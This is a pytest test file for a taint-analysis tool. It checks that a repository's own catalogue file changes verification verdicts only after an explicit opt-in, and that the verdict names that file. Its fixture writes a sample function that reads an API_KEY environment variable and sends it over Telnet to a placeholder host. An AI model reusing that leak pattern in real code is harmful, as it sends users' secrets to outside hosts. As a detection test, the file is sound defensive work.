# SPDX-License-Identifier: AGPL-3.0-or-later
"""A repository's own catalogue data loads only when you opt in (INV-hamin, INV-gumom).

THE FILED REPRO, end to end. ``main.py`` writes ``os.environ["API_KEY"]`` into
``telnetlib.Telnet(...).write`` -- a REAL secret-to-network flow. The claim is
"host_secret must not reach the network". The repository also ships a
``.hypergumbo.toml`` naming ``deps.yaml``, an overlay that grants
``module_completeness: complete`` to ``telnetlib`` and ``telnetlib.Telnet`` (the
module the call resolves to).

Measured on a pinned dev e6dad62c3b before the fix: this fixture read
``confirmed_with_caveats`` rc 3 with ``completeness_grants: []`` and
``user_supplied: false`` -- nothing in the verdict named ``deps.yaml``. Without
the ``.hypergumbo.toml`` it reads ``inconclusive`` rc 2. ADR-0061 ruling 4: the
repository's catalogue data loads only on ``--in-repo-catalogues`` or a grant
recorded with ``hypergumbo trust-catalogues``, and ruling 5: when it does, the
verdict names it under ``in_repo`` with its git state.
"""

from __future__ import annotations

import contextlib
import io
import json
from pathlib import Path

import pytest

from hypergumbo_core.cli import main

_DEPS = """\
language: python
status: overlay
retrieved: 2026-01-01
module_completeness:
  - module: telnetlib
    completeness: complete
    retrieved: "2026-01-01"
  - module: telnetlib.Telnet
    completeness: complete
    retrieved: "2026-01-01"
"""


@pytest.fixture
def repo(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "config"))
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "state"))
    monkeypatch.setenv("XDG_CACHE_HOME", str(tmp_path / "cache"))
    root = tmp_path / "repo"
    root.mkdir()
    (root / "main.py").write_text(
        "import os\nimport telnetlib\n\n\ndef leak():\n"
        '    key = os.environ["API_KEY"]\n'
        '    conn = telnetlib.Telnet("x.example", 23)\n'
        "    conn.write(key.encode())\n"
    )
    (root / "deps.yaml").write_text(_DEPS)
    (root / ".hypergumbo.toml").write_text('io_primitives = ["deps.yaml"]\n')
    (tmp_path / "claims.yaml").write_text(
        "claims:\n  - id: C\n    text: t\n    constraint:\n      taint_flow:\n"
        "        source_taint: host_secret\n        prohibited_sink_zone: network\n"
    )
    return root


def _run(argv: list[str]) -> tuple[int, str, str]:
    out, err = io.StringIO(), io.StringIO()
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
        rc = main(argv)
    return rc, out.getvalue(), err.getvalue()


def _verify(repo: Path, *flags: str) -> tuple[int, dict, str]:
    rc, out, err = _run([
        "verify-claims", str(repo), "--claims", str(repo.parent / "claims.yaml"),
        "--format", "json", *flags,
    ])
    return rc, json.loads(out), err


def test_without_an_opt_in_the_repository_does_not_grade_itself(repo: Path) -> None:
    rc, doc, err = _verify(repo)
    assert (rc, doc["verdicts"][0]["verdict"]) == (2, "inconclusive")
    assert "deps.yaml" in err and "NOT loaded" in err
    assert doc["catalog_provenance"]["tiers"]["in_repo"] == []


def test_the_flag_opts_in_and_the_verdict_names_the_file(repo: Path) -> None:
    """THE CONTROL: opted in, the grant applies exactly as before -- and the
    verdict now says whose file it rested on."""
    rc, doc, _err = _verify(repo, "--in-repo-catalogues")
    assert (rc, doc["verdicts"][0]["verdict"]) == (3, "confirmed_with_caveats")
    prov = doc["catalog_provenance"]
    assert prov["tiers"]["in_repo"] == [{
        "family": "io_primitives", "path": str(repo / "deps.yaml"),
        "git_state": "untracked",
    }]
    assert prov["user_supplied"] is True
    assert [(g["origin"], g["modules"]) for g in prov["completeness_grants"]] == [
        ("in_repo_config", ["telnetlib", "telnetlib.Telnet"]),
    ]


def test_a_recorded_grant_opts_in_for_the_repository(repo: Path) -> None:
    assert _run(["trust-catalogues", str(repo)])[0] == 0
    rc, doc, err = _verify(repo)
    assert (rc, doc["verdicts"][0]["verdict"]) == (3, "confirmed_with_caveats")
    assert "NOT loaded" not in err


def test_a_recorded_refusal_keeps_it_off_and_quiet(repo: Path) -> None:
    assert _run(["trust-catalogues", str(repo), "--revoke"])[0] == 0
    rc, doc, err = _verify(repo)
    assert (rc, doc["verdicts"][0]["verdict"]) == (2, "inconclusive")
    assert "NOT loaded" not in err


def test_your_own_files_are_named_under_yours(repo: Path, tmp_path: Path) -> None:
    """INV-gumom: config.toml and the io_primitives.d channel used to leave no
    trace in the verdict. Both are the operator's."""
    home = tmp_path / "config" / "hypergumbo"
    (home / "io_primitives.d").mkdir(parents=True)
    channel = home / "io_primitives.d" / "mine.yaml"
    channel.write_text("language: python\nstatus: overlay\nretrieved: 2026-01-01\n")
    named = tmp_path / "named.yaml"
    named.write_text("language: python\nstatus: overlay\nretrieved: 2026-01-01\n")
    (home / "config.toml").write_text(f'io_primitives = ["{named}"]\n')
    _rc, doc, _err = _verify(repo)
    yours = {e["path"] for e in doc["catalog_provenance"]["tiers"]["yours"]}
    assert {str(channel), str(named)} <= yours
    builtin = {Path(e["path"]).name for e in doc["catalog_provenance"]["tiers"]["builtin"]}
    assert "python.yaml" in builtin
